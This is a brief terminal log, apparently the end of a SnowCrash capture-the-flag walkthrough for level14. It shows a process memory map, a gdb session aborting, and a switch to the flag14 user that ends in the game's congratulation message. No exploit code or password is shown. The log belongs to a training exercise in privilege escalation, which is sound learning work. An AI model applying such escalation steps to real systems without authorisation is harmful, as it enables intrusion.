b7fde000-b7ffe000 r-xp 00000000 07:00 14081      /lib/i386-linux-gnu/ld-2.15.so
b7ffe000-b7fff000 r--p 0001f000 07:00 14081      /lib/i386-linux-gnu/ld-2.15.so
b7fff000-b8000000 rw-p 00020000 07:00 14081      /lib/i386-linux-gnu/ld-2.15.so
bffdf000-c0000000 rw-p 00000000 00:00 0          [stack]

Program received signal SIGABRT, Aborted.
0xb7fdd428 in __kernel_vsyscall ()
(gdb) quit
A debugging session is active.

	Inferior 1 [process 17059] will be killed.

Quit anyway? (y or n) y
level14@SnowCrash:~$ su flag14
Password: 
Congratulation. Type getflag to get the key and send it to me the owner of this livecd :)
```




